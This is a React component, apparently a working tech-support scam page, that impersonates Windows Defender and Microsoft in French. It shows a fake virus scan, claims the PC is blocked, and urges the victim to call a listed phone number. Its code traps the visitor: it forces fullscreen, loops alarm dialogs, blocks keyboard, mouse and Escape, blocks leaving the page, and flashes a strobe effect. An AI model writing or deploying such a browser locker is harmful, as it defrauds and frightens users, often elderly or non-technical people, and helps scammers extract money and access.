import { useState, useEffect, useRef } from "react";

const SecurityDemo = () => {
  useEffect(() => {
    const voiceAudio = new Audio("/uhm.mp3");
    voiceAudio.play().catch((e) => console.log("Voice play failed:", e));

    const cursorInterval = setInterval(() => {
      document.body.style.cursor =
        document.body.style.cursor === "none" ? "default" : "none";
    }, 800);

    return () => {
      clearInterval(cursorInterval);
      document.body.style.cursor = "default";
    };
  }, []);
  useEffect(() => {
    const handleBeforeUnload = (e) => {
      e.preventDefault();
      e.returnValue =
        "ALERTE SÉCURITÉ: Votre système est infecté! Ne fermez pas cette fenêtre ou vos données seront compromises!";
      return e.returnValue;
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, []);
  useEffect(() => {
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        setIsFullscreen(false);

        // Start alert loop
        const alertLoop = () => {
          const userChoice = confirm(
            "ALERTE SÉCURITÉ CRITIQUE!\n\nVotre système est infecté par un virus dangereux!\nNe quittez pas le mode plein écran ou vos données seront volées!\n\nCliquez sur OK pour revenir en sécurité ou Annuler pour risquer la perte de données."
          );

          if (userChoice) {
            enterFullscreen();
          } else {
            setTimeout(alertLoop, 1000);
          }
        };

        setTimeout(alertLoop, 1000);
      } else {
        setIsFullscreen(true);
      }
    };

    document.addEventListener("fullscreenchange", handleFullscreenChange);
    document.addEventListener("webkitfullscreenchange", handleFullscreenChange);

    return () => {
      document.removeEventListener("fullscreenchange", handleFullscreenChange);
      document.removeEventListener(
        "webkitfullscreenchange",
        handleFullscreenChange
      );
    };
  }, []);
  const enterFullscreen = () => {
    const el = document.documentElement;
    if (el.requestFullscreen) {
      el.requestFullscreen();
    } else if (el.webkitRequestFullscreen) {
      el.webkitRequestFullscreen();
    } else if (el.msRequestFullscreen) {
      el.msRequestFullscreen();
    }
  };
  const [currentStep, setCurrentStep] = useState(1);
  const [scanProgress, setScanProgress] = useState(0);
  const [threatsFound, setThreatsFound] = useState(0);
  const [itemsScanned, setItemsScanned] = useState(0);
  const [showPopup, setShowPopup] = useState(false);
  const [showWelcome, setShowWelcome] = useState(false);
  const [audioEnabled, setAudioEnabled] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [blackScreen, setBlackScreen] = useState(false);
  const audioRef = useRef(null);
  const containerRef = useRef(null);

  useEffect(() => {
    const lockKeyboard = async () => {
      try {
        if (navigator.keyboard && navigator.keyboard.lock) {
          await navigator.keyboard.lock(["Escape"]);
        }
      } catch (error) {
        console.log("Keyboard lock not supported or failed:", error);
      }
    };

    const blockMouse = (e) => {
      e.preventDefault();
    };

    const blockKeyboard = (e) => {
      e.preventDefault();
    };

    const blockContextMenu = (e) => {
      e.preventDefault();
      return false;
    };

    document.addEventListener("mousedown", blockMouse);
    document.addEventListener("mouseup", blockMouse);
    document.addEventListener("mousemove", blockMouse);
    document.addEventListener("keydown", blockKeyboard);
    document.addEventListener("keyup", blockKeyboard);
    document.addEventListener("keypress", blockKeyboard);
    document.addEventListener("contextmenu", blockContextMenu);

    lockKeyboard();

    return () => {
      document.removeEventListener("mousedown", blockMouse);
      document.removeEventListener("mouseup", blockMouse);
      document.removeEventListener("mousemove", blockMouse);
      document.removeEventListener("keydown", blockKeyboard);
      document.removeEventListener("keyup", blockKeyboard);
      document.removeEventListener("keypress", blockKeyboard);
      document.removeEventListener("contextmenu", blockContextMenu);

      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
    };
  }, []);
  const content = {
    title: "🚨 ALERTE CENTRE DE SÉCURITÉ WINDOWS DEFENDER",
    blocked: "L'ACCÈS À CE PC A ÉTÉ BLOQUÉ POUR DES RAISONS DE SÉCURITÉ",
    infected:
      "Votre ordinateur nous a alerté qu'il a été infecté par un logiciel malveillant",
    phone: "031 539 15 04",
    support: "Contactez l'assistance Windows",
    malware: "Logiciels malveillants détectés",
    close: "ne fermez pas la fenêtre de protection",
    scanning: "Analyse en cours...",
    threatsFound: "Menaces trouvées",
    callNow: "APPELEZ MAINTENANT",
    immediate: "Assistance immédiate requise",
    dontClose: "Ne fermez pas cette fenêtre",
    systemBlocked: "Système bloqué par sécurité",
    urgentCall: "APPEL URGENT REQUIS",
  };

  const [zoomEffect, setZoomEffect] = useState(false);

  // Add this new useEffect for automatic progress and popup
  useEffect(() => {
    // Start progress immediately
    const progressTimer = setInterval(() => {
      setScanProgress((prev) => {
        const newProgress = prev + 1;

        // Update items scanned based on progress
        setItemsScanned(Math.floor((newProgress / 100) * 51900));

        // Add threats at specific progress points
        if (newProgress === 25) setThreatsFound(3);
        if (newProgress === 50) setThreatsFound(7);
        if (newProgress === 75) setThreatsFound(11);
        if (newProgress === 90) setThreatsFound(15);

        // Move to next step when complete
        if (newProgress >= 100) {
          clearInterval(progressTimer);
          setTimeout(() => {
            setCurrentStep(2);
            // Show popup after a short delay
            setTimeout(() => {
              setZoomEffect(true);
              setShowPopup(true);
              if (!audioEnabled) {
                setAudioEnabled(true);
                if (audioRef.current) {
                  audioRef.current
                    .play()
                    .catch((e) => console.log("Audio play failed:", e));
                }
              }
            }, 1500);
          }, 1000);
          return 100;
        }

        return newProgress;
      });
    }, 150); // Progress every 150ms for smooth animation

    return () => clearInterval(progressTimer);
  }, [audioEnabled]);
  const forceFullscreen = () => {
    if (!isFullscreen) {
      enterFullscreen();
    }
  };

  const triggerStrobeEffect = () => {
    setBlackScreen(true);
    setTimeout(() => {
      setBlackScreen(false);
      setTimeout(() => {
        setBlackScreen(true);
        setTimeout(() => {
          setBlackScreen(false);
          setTimeout(() => {
            setBlackScreen(true);
            setTimeout(() => {
              setBlackScreen(false);
            }, 100);
          }, 80);
        }, 100);
      }, 80);
    }, 100);
  };

  const f11PressStart = useRef(null);
  const holdDuration = 2000; // 2 seconds to consider as "long press"
  const [f11Pressed, setF11Pressed] = useState(false);
  const [f11Timer, setF11Timer] = useState(null);
  const [f11Progress, setF11Progress] = useState(0);

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === "F11") {
        e.preventDefault();
        e.stopPropagation();

        if (!f11Pressed) {
          setF11Pressed(true);
          setF11Progress(0);
          f11PressStart.current = Date.now();

          const progressInterval = setInterval(() => {
            setF11Progress((prev) => {
              if (prev >= 100) {
                clearInterval(progressInterval);
                return 100;
              }
              return prev + 2.5;
            });
          }, 25);

          const timer = setTimeout(() => {
            if (document.fullscreenElement) {
              document.exitFullscreen().catch((err) => {
                console.error("Error exiting fullscreen:", err);
              });
            }
            setF11Pressed(false);
            setF11Progress(0);
            clearInterval(progressInterval);
          }, holdDuration);

          setF11Timer(timer);
        }
      } else {
        e.preventDefault();
        e.stopPropagation();
        forceFullscreen();
        triggerStrobeEffect();

        if (!audioEnabled) {
          setAudioEnabled(true);
          if (audioRef.current) {
            audioRef.current
              .play()
              .catch((e) => console.log("Audio play failed:", e));
          }
        }
        return false;
      }
    };

    const handleKeyUp = (e) => {
      if (e.key === "F11") {
        e.preventDefault();
        e.stopPropagation();

        if (f11Timer) {
          clearTimeout(f11Timer);
          setF11Timer(null);
        }
        setF11Pressed(false);
        setF11Progress(0);
      }
    };

    const blockContextMenu = (e) => {
      e.preventDefault();
      forceFullscreen();
      triggerStrobeEffect();
      return false;
    };

    const blockSelection = (e) => {
      e.preventDefault();
      return false;
    };

    document.addEventListener("keydown", handleKeyDown, true);
    document.addEventListener("keyup", handleKeyUp, true);
    document.addEventListener("contextmenu", blockContextMenu);
    document.addEventListener("selectstart", blockSelection);
    document.addEventListener("dragstart", blockSelection);

    return () => {
      document.removeEventListener("keydown", handleKeyDown, true);
      document.removeEventListener("keyup", handleKeyUp, true);
      document.removeEventListener("contextmenu", blockContextMenu);
      document.removeEventListener("selectstart", blockSelection);
      document.removeEventListener("dragstart", blockSelection);
      if (f11Timer) {
        clearTimeout(f11Timer);
      }
    };
  }, [f11Pressed, f11Timer, isFullscreen, audioEnabled]);

  const handleUserInteraction = () => {
    forceFullscreen();
    triggerStrobeEffect();

    if (!audioEnabled) {
      setAudioEnabled(true);
      if (audioRef.current) {
        audioRef.current
          .play()
          .catch((e) => console.log("Audio play failed:", e));
      }
    }
    setShowPopup(true);
  };

  const handleButtonClick = (callback) => {
    forceFullscreen();
    triggerStrobeEffect();
    setTimeout(() => {
      if (callback) callback();
    }, 500);
  };

  const generateThreatData = () => {
    return [
      [
        "Adware.Win32.MyWebSearch",
        "Logiciels malveillants",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "Trojan.Win32.Swrort.A",
        "Logiciels malveillants",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "PUP.Optional.Conduit",
        "Potentiellement indésirable",
        "Valeur de registre",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "Adware.Bundler",
        "Potentiellement indésirable",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "Trojan.DNSCharge.AC",
        "Logiciels malveillants",
        "Valeur de registre",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "Trojan.Dropper.Autoit",
        "Logiciels malveillants",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "PUP.Optional.RelevantK",
        "Potentiellement indésirable",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
      [
        "PUP.Optional.DownLoad",
        "Potentiellement indésirable",
        "Fichier",
        "HKLM\\SYSTEM\\CURRENTCONTROLS",
      ],
    ];
  };

  const WindowsDefenderHeader = () => (
    <div className="windows-defender-header">
      <div className="defender-title-bar">
        <div className="defender-logo-section">
          <div className="defender-shield">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path
                d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"
                fill="#0078d4"
              />
              <path
                d="M12 7L8 11l2 2 4-4"
                stroke="white"
                strokeWidth="2"
                fill="none"
              />
            </svg>
          </div>
          <div className="defender-text">
            <div className="defender-title">Sécurité Windows</div>
            <div className="defender-subtitle">
              Protection contre les virus et menaces
            </div>
          </div>
        </div>
        <div className="defender-controls">
          <button
            className="defender-minimize"
            onClick={() => handleButtonClick()}
          >
            <svg width="12" height="12" viewBox="0 0 12 12">
              <path d="M0 6h12" stroke="currentColor" strokeWidth="1" />
            </svg>
          </button>
          <button
            className="defender-maximize"
            onClick={() => handleButtonClick()}
          >
            <svg width="12" height="12" viewBox="0 0 12 12">
              <path
                d="M0 0h12v12H0z"
                fill="none"
                stroke="currentColor"
                strokeWidth="1"
              />
            </svg>
          </button>
          <button
            className="defender-close"
            onClick={() => handleButtonClick()}
          >
            <svg width="12" height="12" viewBox="0 0 12 12">
              <path
                d="M0 0l12 12M12 0L0 12"
                stroke="currentColor"
                strokeWidth="1"
              />
            </svg>
          </button>
        </div>
      </div>
      <div className="defender-nav">
        <div className="nav-item active">
          <div className="nav-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
              <path d="M8 1L2 4v4c0 3.7 2.56 7.16 6 8 3.44-.84 6-4.3 6-8V4l-6-3z" />
            </svg>
          </div>
          <span>Protection contre les virus et menaces</span>
        </div>
        <div className="nav-item">
          <div className="nav-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
              <path d="M8 2C4.7 2 2 4.7 2 8s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6zm0 10c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4z" />
            </svg>
          </div>
          <span>Pare-feu et protection réseau</span>
        </div>
        <div className="nav-item">
          <div className="nav-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
              <path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4a1 1 0 112 0v3a1 1 0 11-2 0V4zm1 8a1 1 0 100-2 1 1 0 000 2z" />
            </svg>
          </div>
          <span>Contrôle des applications et du navigateur</span>
        </div>
      </div>
    </div>
  );

  const ScanningStep = () => (
    <div className="windows-defender-container">
      <WindowsDefenderHeader />
      <div className="defender-content">
        <div className="scan-section">
          <div className="scan-title">
            <div className="scan-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <circle
                  cx="16"
                  cy="16"
                  r="14"
                  stroke="#0078d4"
                  strokeWidth="2"
                />
                <circle
                  cx="16"
                  cy="16"
                  r="10"
                  stroke="#0078d4"
                  strokeWidth="2"
                />
                <circle
                  cx="16"
                  cy="16"
                  r="6"
                  stroke="#0078d4"
                  strokeWidth="2"
                />
                <circle cx="16" cy="16" r="2" fill="#0078d4" />
              </svg>
            </div>
            <div>
              <h2>Analyse rapide</h2>
              <p>Analyse de votre appareil pour détecter les menaces...</p>
            </div>
          </div>

          <div className="scan-progress-section">
            <div className="progress-ring">
              <svg className="progress-ring-svg" width="120" height="120">
                <circle
                  className="progress-ring-circle-bg"
                  cx="60"
                  cy="60"
                  r="52"
                />
                <circle
                  className="progress-ring-circle"
                  cx="60"
                  cy="60"
                  r="52"
                  style={{
                    strokeDasharray: `${(scanProgress / 100) * 327} 327`,
                  }}
                />
              </svg>
              <div className="progress-text">
                <div className="progress-pertage">{scanProgress}%</div>
                <div className="progress-label">Terminé</div>
              </div>
            </div>

            <div className="scan-stats-grid">
              <div className="stat-item">
                <div className="stat-number">
                  {itemsScanned.toLocaleString()}
                </div>
                <div className="stat-label">Fichiers analysés</div>
              </div>
              <div className="stat-item">
                <div className="stat-number">00:07</div>
                <div className="stat-label">Temps écoulé</div>
              </div>
              <div className="stat-item threat-stat">
                <div className="stat-number threat-number">{threatsFound}</div>
                <div className="stat-label">Menaces trouvées</div>
              </div>
            </div>
          </div>
        </div>

        <div className="scan-actions">
          <button
            className="windows-button secondary"
            onClick={() => handleButtonClick()}
          >
            Annuler l'analyse
          </button>
          <button
            className="windows-button secondary"
            onClick={() => handleButtonClick()}
          >
            Suspendre l'analyse
          </button>
        </div>
      </div>
    </div>
  );

  const ResultsStep = () => (
    <div className="windows-defender-container">
      <WindowsDefenderHeader />
      <div className="defender-content">
        <div className="results-section">
          <div className="results-header">
            <div className="results-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <circle cx="16" cy="16" r="14" fill="#dc2626" />
                <path d="M16 8v8M16 20v2" stroke="white" strokeWidth="2" />
              </svg>
            </div>
            <div>
              <h2>Menaces détectées</h2>
              <p>
                Nous avons trouvé {threatsFound} menaces qui nécessitent votre
                attention
              </p>
            </div>
          </div>

          <div className="threat-summary">
            <div className="summary-cards">
              <div className="summary-card">
                <div className="card-number">15</div>
                <div className="card-label">Éléments détectés</div>
              </div>
              <div className="summary-card">
                <div className="card-number">4 sec</div>
                <div className="card-label">Temps d'analyse</div>
              </div>
              <div className="summary-card">
                <div className="card-number">51,900</div>
                <div className="card-label">Éléments analysés</div>
              </div>
            </div>
          </div>

          <div className="threats-list">
            <div className="list-header">
              <h3>Menaces détectées</h3>
              <button
                className="select-all"
                onClick={() => handleButtonClick()}
              >
                Tout sélectionner
              </button>
            </div>

            <div className="threats-table">
              {generateThreatData().map((threat, index) => (
                <div key={index} className="threat-row">
                  <div className="threat-checkbox">
                    <input type="checkbox" checked readOnly />
                  </div>
                  <div className="threat-info">
                    <div className="threat-name">{threat[0]}</div>
                    <div className="threat-type">{threat[1]}</div>
                    <div className="threat-location">{threat[3]}</div>
                  </div>
                  <div className="threat-status">
                    <span className="status-badge quarantine">
                      Mis en quarantaine
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="results-actions">
          <button
            className="windows-button secondary"
            onClick={() => handleButtonClick()}
          >
            Voir les détails
          </button>
          <button
            className="windows-button secondary"
            onClick={() => handleButtonClick(() => setCurrentStep(3))}
          >
            Fermer
          </button>
          <button
            className="windows-button primary danger"
            onClick={() => handleButtonClick(() => handleUserInteraction())}
          >
            Supprimer tout
          </button>
        </div>
      </div>
    </div>
  );

  const FinalStep = () => (
    <div className="windows-defender-container">
      <WindowsDefenderHeader />
      <div className="defender-content">
        <div className="final-section">
          <div className="scan-in-progress">
            <div className="scan-animation">
              <div className="scan-radar">
                <div className="radar-sweep"></div>
                <div className="radar-center"></div>
              </div>
              <div className="scan-device">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                  <rect
                    x="8"
                    y="12"
                    width="48"
                    height="32"
                    rx="2"
                    fill="#374151"
                  />
                  <rect x="12" y="16" width="40" height="24" fill="#1f2937" />
                  <rect x="28" y="44" width="8" height="4" fill="#374151" />
                  <rect x="20" y="48" width="24" height="2" fill="#374151" />
                </svg>
              </div>
            </div>

            <div className="scan-steps">
              <div className="step completed">
                <div className="step-icon">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="7" fill="#10b981" />
                    <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="2" />
                  </svg>
                </div>
                <span>Vérification des mises à jour</span>
              </div>
              <div className="step completed">
                <div className="step-icon">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="7" fill="#10b981" />
                    <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="2" />
                  </svg>
                </div>
                <span>Analyse de la mémoire</span>
              </div>
              <div className="step completed">
                <div className="step-icon">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="7" fill="#10b981" />
                    <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="2" />
                  </svg>
                </div>
                <span>Analyse des éléments de démarrage</span>
              </div>
              <div className="step active">
                <div className="step-icon">
                  <div className="loading-spinner"></div>
                </div>
                <span>Analyse du registre</span>
              </div>
              <div className="step">
                <div className="step-icon">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="7" fill="#9ca3af" />
                  </svg>
                </div>
                <span>Analyse du système de fichiers</span>
              </div>
            </div>
          </div>

          <div className="scan-metrics">
            <div className="metric-group">
              <div className="metric-title">Durée d'analyse</div>
              <div className="metric-value">3 min 15 sec</div>
            </div>
            <div className="metric-group">
              <div className="metric-title">Éléments analysés</div>
              <div className="metric-value">51,900</div>
            </div>
            <div className="metric-group">
              <div className="metric-title">Menaces détectées</div>
              <div className="metric-value threat-metric">11</div>
            </div>
          </div>
        </div>

        <div className="critical-warning">
          <div className="warning-icon">
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
              <path d="M16 3L2 29h28L16 3z" fill="#dc2626" />
              <path d="M16 10v8M16 22v2" stroke="white" strokeWidth="2" />
            </svg>
          </div>
          <div className="warning-content">
            <h3>Alerte de sécurité critique</h3>
            <p>
              Votre système est en danger. {content.malware} - {content.close}
            </p>
          </div>
        </div>
      </div>
    </div>
  );

  const PopupModal = () =>
    showPopup && (
      <div className="popup-overlay">
        <div className="popup-content">
          <div className="popup-header">
            <div className="popup-title">
              <div className="popup-icon">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path
                    d="M10 2L3 5v5c0 4.6 3.2 8.95 7 10 3.8-1.05 7-5.4 7-10V5l-7-3z"
                    fill="#0078d4"
                  />
                </svg>
              </div>
              Centre de sécurité Windows Defender
            </div>
            <button
              className="popup-close"
              onClick={() => handleButtonClick(() => setShowPopup(false))}
            >
              <svg width="12" height="12" viewBox="0 0 12 12">
                <path
                  d="M0 0l12 12M12 0L0 12"
                  stroke="currentColor"
                  strokeWidth="1"
                />
              </svg>
            </button>
          </div>

          <div className="popup-body">
            <div className="alert-banner">
              <div className="alert-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                  <path d="M12 2L2 22h20L12 2z" fill="#dc2626" />
                  <path d="M12 8v6M12 18v1" stroke="white" strokeWidth="2" />
                </svg>
              </div>
              <div className="alert-text">
                <strong>Menace détectée: Trojan.Win32.Suspect</strong>
                <br />
                Application: Ads.fiancetrack(2).dll
              </div>
            </div>

            <div className="popup-image">
              <div className="security-graphic">
                <div className="shield-icon">
                  <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                    <path
                      d="M24 4L8 12v12c0 11.1 7.68 21.48 16 24 8.32-2.52 16-12.9 16-24V12L24 4z"
                      fill="#0078d4"
                    />
                    <path
                      d="M24 14L18 22l4 4 8-8"
                      stroke="white"
                      strokeWidth="3"
                      fill="none"
                    />
                  </svg>
                </div>
                <div className="warning-overlay">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2L2 22h20L12 2z" fill="#dc2626" />
                    <path d="M12 8v6M12 18v1" stroke="white" strokeWidth="2" />
                  </svg>
                </div>
              </div>
            </div>

            <div className="popup-message">
              <p className="main-message">{content.blocked}</p>
              <p className="support-message">{content.support}</p>
              <div className="big-phone-container">
                <div className="urgent-label">{content.urgentCall}</div>
                <div className="big-phone-number">{content.phone}</div>
                <div
                  className="call-now-btn"
                  onClick={() => handleButtonClick()}
                >
                  {content.callNow}
                </div>
              </div>
              <p className="instruction-message">
                Appelez immédiatement pour éviter le vol de données et les
                dommages système.
              </p>
            </div>

            <div className="popup-footer">
              <div className="microsoft-badge">
                <div className="badge-icon">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <path
                      d="M0 0h7v7H0zM9 0h7v7H9zM0 9h7v7H0zM9 9h7v7H9z"
                      fill="#0078d4"
                    />
                  </svg>
                </div>
                <span>Microsoft Corporation</span>
              </div>
              <div className="popup-actions">
                <button
                  className="popup-button secondary"
                  onClick={() => handleButtonClick(() => setShowPopup(false))}
                >
                  Retour
                </button>
                <button
                  className="popup-button primary"
                  onClick={() => handleButtonClick(() => setShowWelcome(true))}
                >
                  Obtenir de l'aide
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );

  const WelcomeDialog = () =>
    showWelcome && (
      <div className="welcome-overlay">
        <div className="welcome-content">
          <div className="welcome-header">
            <div className="critical-icon">
              <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                <path d="M24 4L4 44h40L24 4z" fill="#fbbf24" />
                <path d="M24 16v12M24 34v2" stroke="#1f2937" strokeWidth="3" />
              </svg>
            </div>
            <h2>ALERTE DE SÉCURITÉ SYSTÈME</h2>
            <div className="alert-decoration"></div>
          </div>

          <div className="welcome-body">
            <div className="security-breach">
              <p className="breach-title">** {content.blocked} **</p>
              <p className="breach-description">
                {content.infected}. Les données suivantes peuvent être
                compromises:
              </p>
            </div>

            <div className="compromised-list">
              <div className="data-item">
                <div className="data-icon">
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                  >
                    <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                    <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                  </svg>
                </div>
                <span>Identifiants de messagerie</span>
              </div>
              <div className="data-item">
                <div className="data-icon">
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                  >
                    <path d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4zm0 2h12v8H4V6z" />
                  </svg>
                </div>
                <span>Détails bancaires</span>
              </div>
              <div className="data-item">
                <div className="data-icon">
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                  >
                    <path d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-6-3a2 2 0 11-4 0 2 2 0 014 0zm-2 4a5 5 0 00-4.546 2.916A5.986 5.986 0 0010 16a5.986 5.986 0 004.546-2.084A5 5 0 0010 11z" />
                  </svg>
                </div>
                <span>Connexion Facebook</span>
              </div>
              <div className="data-item">
                <div className="data-icon">
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                  >
                    <path d="M4 3a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V5a2 2 0 00-2-2H4zm12 12H4l4-8 3 6 2-4 3 6z" />
                  </svg>
                </div>
                <span>Photos et documents privés</span>
              </div>
            </div>

            <div className="warning-text">
              <p>
                Windows Defender a détecté des logiciels publicitaires
                potentiellement indésirables qui peuvent voler vos mots de
                passe, votre identité en ligne, vos informations financières,
                vos fichiers personnels, photos ou documents.
              </p>
              <p>
                Appelez immédiatement le support Microsoft pour signaler cette
                menace, prévenir le vol d'identité et débloquer l'accès à cet
                appareil.
              </p>
              <p className="critical-warning">
                La fermeture de cette fenêtre compromettra vos informations
                personnelles et entraînera la suspension de votre inscription
                Windows.
              </p>
            </div>

            <div className="support-call">
              <div className="call-icon">
                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                  <path
                    d="M6 3h4l2 7-3 2c1.6 3.2 4.8 6.4 8 8l2-3 7 2v4c0 1.1-.9 2-2 2C12.9 25 3 15.1 3 4c0-1.1.9-2 2-2z"
                    fill="#fbbf24"
                  />
                </svg>
              </div>
              <div className="call-text">
                <span>Appelez le support Microsoft maintenant:</span>
                <div className="phone-number-big">{content.phone}</div>
              </div>
            </div>
          </div>

          <div className="welcome-actions">
            <button
              className="welcome-button primary"
              onClick={() => handleButtonClick(() => setShowWelcome(false))}
            >
              Appeler maintenant
            </button>
            <button
              className="welcome-button secondary"
              onClick={() => handleButtonClick(() => setShowWelcome(false))}
            >
              Obtenir de l'aide
            </button>
          </div>
        </div>
      </div>
    );

  return (
    <div
      ref={containerRef}
      className={`security-demo ${isFullscreen ? "fullscreen" : ""}`}
      onClick={handleUserInteraction}
    >
      {blackScreen && <div className="black-screen-overlay"></div>}

      <audio ref={audioRef}>
        <source
          src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBjuZ3PLEcCQFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LNeSsFJHfH8N2QQAkUXrTp66hVFApGn+DyvmEbBg=="
          type="audio/wav"
        />
      </audio>

      <div className="windows-background">
        <div className="background-image"></div>
        <div className="background-overlay"></div>
      </div>

      <div className="main-content">
        {currentStep === 1 && <ScanningStep />}
        {currentStep === 2 && <ResultsStep />}
        {currentStep === 3 && <FinalStep />}
      </div>

      <div className="taskbar">
        <div className="taskbar-left">
          <div className="start-button" onClick={() => handleButtonClick()}>
            <div className="windows-logo">
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path
                  d="M0 0h9v9H0zM11 0h9v9h-9zM0 11h9v9H0zM11 11h9v9h-9z"
                  fill="#0078d4"
                />
              </svg>
            </div>
          </div>
          <div className="taskbar-search" onClick={() => handleButtonClick()}>
            <div className="search-icon">
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <circle
                  cx="7"
                  cy="7"
                  r="5"
                  stroke="currentColor"
                  strokeWidth="2"
                />
                <path d="M12 12l-2-2" stroke="currentColor" strokeWidth="2" />
              </svg>
            </div>
            <span>Tapez ici pour rechercher</span>
          </div>
        </div>
        <div className="taskbar-right">
          <div className="system-tray">
            <div className="tray-time">
              <div>
                {new Date().toLocaleTimeString([], {
                  hour: "2-digit",
                  minute: "2-digit",
                })}
              </div>
              <div>{new Date().toLocaleDateString()}</div>
            </div>
          </div>
        </div>
      </div>

      <PopupModal />
    </div>
  );
};

export default SecurityDemo;
